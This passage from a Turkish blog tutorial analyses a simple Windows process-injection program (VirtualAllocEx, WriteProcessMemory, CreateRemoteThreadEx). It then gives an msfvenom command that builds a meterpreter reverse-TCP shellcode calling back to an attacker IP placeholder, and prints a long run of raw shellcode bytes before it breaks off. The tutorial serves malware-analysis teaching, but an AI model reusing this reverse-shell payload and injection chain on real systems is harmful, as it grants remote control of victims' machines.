+<p>Öncelikle bu iki bayrağın Hex karşılıklarına baktığımızda 0x00001000 ve 0x00002000 değerlerini görüyoruz. Bu tip konularda bu hex değerleri binary’e çevirip bitwise OR işlemine tabi tutarak ne olduğunu anlayabiliriz. Bitwise OR işlemine tabi tutmamızın nedeni de arka planda bunun gibi parametrelerin binary değerleri Bitwise OR işlemi sonucuyla işlemler yapılması. Dolayasıyla bilmediğiniz bir malware’i analiz ettiğinizde böyle fonksiyon parametrelerine denk geldiğinizde gerekli işlemler yaparak ne olduğunu anlayabilirsiniz.</p>
+
+<p>Eğer buraya kadar hayattan soğuduysanız ve daha da hayattan bıkmak istiyorsanız değerleri nasıl bulacağımıza geçelim! Let’s goo!</p>
+
+<p>Her şey den önce bitwise OR’u tanıyalım:</p>
+
+<blockquote>
+  <p>“Bitwise OR, bilgisayar programlamasında kullanılan bir operatördür. Bu operatör, iki sayının her bir bitini karşılaştırır ve en az birinin 1 olduğu bitleri 1 olarak ayarlar.”</p>
+</blockquote>
+
+<p>Yani kısaca iki sayının bitleri alt alta karşılaştırılır. Karşılaştırılmada herhangi bitin 1 olması sonucu 1 yapar. Mesela 5 (101) ve 8 (1000) rakamların binary karşılıklarının bitwise or işlemi ile sonucuna bakalım:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  1000 (8)
+OR
+  0101 (5) --&gt; bit eksikliği olduğu için en sona 0 ekliyoruz.
+  ----
+  1101 (13)
+</code></pre></div></div>
+
+<p>Gördüğünüz gibi tek tek bitleri karşılaştırdığımızda herhangi birinde 1 olması sonucu 1 yapıyor. Parantez içerisinde gördüğünüz sayılarda decimal karşılığı. Yani sonucumuz 13. Eğer bunu anladıysak şimdi ise bunu bayraklarımızda deneyelim.</p>
+
+<p>Öncelikle MEM_COMMIT ve MEM_RESERVE bayrakların hex karşılıklarını binary’e çevirelim:</p>
+
+<ul>
+  <li>
+    <p>0x00001000 → 00000000000000000001000000000000</p>
+  </li>
+  <li>
+    <p>0x00002000 → 00000000000000000010000000000000</p>
+  </li>
+</ul>
+
+<p>Bu tip çözümlerden önce hex değerleri binary’e çevirin. Bunu da online siteler ile yapabilirsiniz.</p>
+
+<p>Şimdi ise bitwise or işlemine geçelim:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  00000000000000000001000000000000
+OR
+  00000000000000000010000000000000
+  --------------------------------
+  00000000000000000011000000000000
+</code></pre></div></div>
+
+<p>Sonuca baktığımızda 00000000000000000011000000000000 değerini bulduk. Şimdi ise bunu hex değerine çevirelim ve sonuca bakalım:</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ctbWuV2mQOzgr0sQjtmWDw.png" /></p>
+<h4> Bitwise OR Sonucu </h4>
+
+<p>WOAHH! Gördüğünüz gibi sonuç 3000 çıktı. Böylece sonucu da görmüş olduk.</p>
+
+<p>Buradan şunu anlayabiliriz ki bir malware analizinde VirtualAllocEx’in parametrelerine göz attığınızda bundan farklı değerler de görebilirisinz mesela 3000h değil de 82000h değeri gibi. Sonucu bulmak için de bayrakların hex’lerin binary karşılıklarını bitwise or işlemi ile sonucu elde edip hangi bayrakların olduğunu tespit edebilirsiniz.</p>
+
+<p>Tabi ki sadece VirtualAllocEx için anlatmadım buradaki yöntemi. Bilip bilmediğim diğer fonksiyon parametreleri için de bu yöntemi uygulayabilirsiniz. Eğer parametre olarak hex değeri görürseniz bunu uygulayabilir ardından dökümanlar ile hangi parametrenin olduğunu anlayabilirsiniz ya da “ben hayatımdan memnun bir bireyim” diyorsanız da yapay zekalara direkt çözdürebilirsiniz.</p>
+
+<p>Okayyy! Hayatınızdan bir nebze olsa bile sizi soğuttuysam kaldığımız yerden devam edelim:</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*k6qpyNDpyyg7GKJD1MzaPA.png" /></p>
+<h4> VirtualAllocEx Parametreleri </h4>
+
+<p>Ondan sonra ise r8d register’a 5 değeri aktarıldığı görülüyor. Bu, hedef Process içerisinde yer ayrılacak olan bellek alanın boyutu. Burada 5 gözüküyor ancak siz shellcode gibi şeyler yerleştirdiğinizde 512 byte gibi bir yer ayrılabilir.</p>
+
+<p>Ondan sonra ise edx’e 0 verildiğini görülmektedir. Bu parametre ise yer ayırdığımız belleğin başlangıç adresini göstermektedir (lpAddress). 0 ise NULL’u temsil etmektedir. Yani bu fonksiyonda başlangıç adresine NULL değerini verirseniz yer ayrılan bellek bölümüne sistem tarafından otomatik bir başlangıç adresi atanacaktır.</p>
+
+<p>Daha sonrada rax register’a yukarıda OpenProcess’da bahsettiğimiz gibi VirtualAllocEx fonksiyonun başlangıç adresi aktarılmaktadır. En son ise rax’ aktarılan adres ile program oraya yönlendiriliyor.</p>
+
+<p>Program tekrar loc_14000163F konumuna döndüğünde de rbp+lpBaseAddress adresine rax aracılığıyla VirtualAllocEx’in başlangıç adresi aktarılıyor. Eğer sonuç NULL değilse program loc_1400016C8 konumuna gidiyor. Bunu artık ilerideki kodlarda bahsetmeyeceğim artık anlamışsınızdır diye düşünüyorum.</p>
+
+<p>Bunlara göre bu kodun decompiler edilmiş hali şu şekilde olacaktır:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*MKC-ZtoeFOkssJbZe__9eA.png" /></p>
+<h4> loc_1400016C8 Location </h4>
+
+<p>Bu kısmın ilk kodlarına baktığımızda ilk olarak VirtualAllocEx ile sanal olarak yer ayırdığımız bellek alanın başlangıç adresi rax register’ına aktarılıyor. Bunun sebebi ise aşağıdaki kodlardan gördüğümüz üzere “Allocated %zu-bytes to %p Address” mesajını bastırmak için bu adresi alıyor ve ardından shellcode uzunluğunu da ekrana bastırmak için r8d register’a da 5 değeri aktarılıyor. Sonra da printf fonksiyonuna gidiliyor.</p>
+
+<p>Biraz ilerideki kodlara göz attığımızda WriteProcessMemory fonksiyonun çağırıldığını görüyoruz. Yani, VirtualAllocEx ile ayrılan bellek alanına veri yazacağını anlayabiliriz.</p>
+
+<p>Öncelikle rdx’e Process’in belleğinde yer ayırdığımız bellek alanın başlangıç adresi atanıyor. Ardından rax’a OpenProcess’in başlangıç adresi de atanıyor. Sonra WriteProcessMemory’in son parametresi olan lpNumberOfBytesWritten’a parametre olarak 0 (yani NULL) aktarıldığını görüyoruz. Ardından alana yazdırılacak verinin 5 boyutunda olduğunu görmekteyiz; çünkü r9d register’a yazılacak verinin boyutu aktarılıyor.</p>
+
+<p>Ardından r8 register’a yazdırılacak verinin kendisini görüyoruz yani ‘AAAA’. Ben örnek kodda \x41\x41\x41\x41 yazdığım için böyle. İlerideki dakikalarda koda bir payload koyacağız.</p>
+
+<p>Son olarak ise rcx’e rax’ın değeri yani OpenProcess’in başlangıç adresi ekleniyor. Daha sonra ise program WriteProcessMemory fonksiyonuna yönlendiriliyor.</p>
+
+<p>Yani bu komutun decompiler’i şu şekildedir:</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">rbp</span><span class="o">+</span><span class="n">lpBaseAddress</span><span class="p">,</span> <span class="s">"AAAA"</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*9iEdrtjtvt0uRAEexiL7pw.png" /></p>
+<h4> loc_1400016C8 Location </h4>
+
+<p>Kaldığımız yerden devam edersek; program tekrar bu konuma döndüğünde bir mesajı bastıracağını görmekteyiz çünkü ilerideki kodlarda printf fonksiyonu çağırılıyor: “Shellcode was Written on the Target!\n”</p>
+
+<p>Bundan sonraki işlemlerde CreateRemoteThreadEx Fonksiyonu için işlemler yapıldığını görmekteyiz.</p>
+
+<p>Öncelikle rbp+hHandle adresine 0 atandığını görmekteyiz. Ondan sınra ise fonksiyonda parametre olarak kullanılması için önce rdx’e oluşturulan bellek alanın başlangıç adresi aktarılmaktadır ardından hProcess’in adresi ise rax’a aktarılmaktadır. Ondan sonraki gelen parametrelere ise 0 verildiğini görüyoruz. Bu kodun decompiler’i şu şekildedir:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateRemoteThreadEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">rbp</span><span class="o">+</span><span class="n">lpBaseAddress</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*M2pqcyck_Xmg7Ou40U7jcg.png" /></p>
+<h4> loc_140001776 Location </h4>
+
+<p>Buradaki kodlara baktığımızda birçok sayıda ekrana mesaj bastırıldığını ve ilerideki kodlarda WaitForSingleObject fonksiyonun çağırıldığını görmekteyiz. Bu ise uzaktan yerleştirilen zararlı kodun execute edilene kadar programın duraksayacağını göstermektedir. Fonksiyonu anlamak için yukarıdaki bahsedilen API hakkında bilgi alabilirsiniz.
+0x5 — Senaryonun gerçekleştirilmesi</p>
+
+<p>Az da olsa sizlere nasıl basit bir malware’in analiz edilebileceğinden bahsettim. Artık bu kadar çileden sonra bu beklediğimiz senaryoyu gerçekleştirelim.</p>
+
+<p>Öncelikle shellcode oluşturmak için kali ortamında msfvenom’u kullanalım:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">--platform</span> windows <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;SALDIRGAN IP ADDRESS&gt; <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-f</span> c <span class="nt">--var-name</span><span class="o">=</span>bekoShell
+</code></pre></div></div>
+
+<p>Bu komut ile oluşturduğumuz shellcode ile hedef sisteme erişim için bir meterpreter kabuğu oluşturacaktır. Çıktı şu şekilde olmalı:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"</span><span class="se">\x</span><span class="s2">fc</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">cc</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">52"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">65</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">60</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">18</span><span class="se">\x</span><span class="s2">48"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">b7</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">4a</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">3c</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">7c</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">2c</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">41"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">ed</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">51</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">3c</span><span class="se">\x</span><span class="s2">48"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">78</span><span class="se">\x</span><span class="s2">18</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">85</span><span class="se">\x</span><span class="s2">72</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">8b"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">85</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">67</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">8b"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">18</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">48"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">d6</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">c9"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">ac</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">38</span><span class="se">\x</span><span class="s2">e0</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">f1</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">45"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">39</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">d8</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">8b"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">44</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">1c</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">58"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">d0</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">48"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">e0</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">5a</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">12</span><span class="se">\x</span><span class="s2">e9"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">5d</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">be</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">33</span><span class="se">\x</span><span class="s2">32</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">56</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e6</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">a0</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e5"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">bc</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">bb</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">a8</span><span class="se">\x</span><span class="s2">c6</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">54</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e4"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">f1</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">26</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">68"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">29</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">0a"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">89"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">c2</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">ea</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">df</span><span class="se">\x</span><span class="s2">e0</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">d5"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">4c</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">ba"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">99</span><span class="se">\x</span><span class="s2">a5</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">85</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ce</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">e5"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">93</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">ec</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">c8</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">d5"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">f8</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">7e</span><span class="se">\x</span><span class="s2">55</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">f6</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">40</span><span class="se">\x</span><span class="s2">41"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">10</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">f2</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">41"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">a4</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">e5</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">d5</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c3</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">c7</span><span class="se">\x</span><span class="s2">4d</span><span class="se">\x</span><span class="s2">31"</span>
+<span class="s2">"</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">49</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">da</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">f9</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">ba</span><span class="se">\x</span><span class="s2">02</span><span class="se">\x</span><span class="s2">d9</span><span class="se">\x</span><span class="s2">c8"</span>
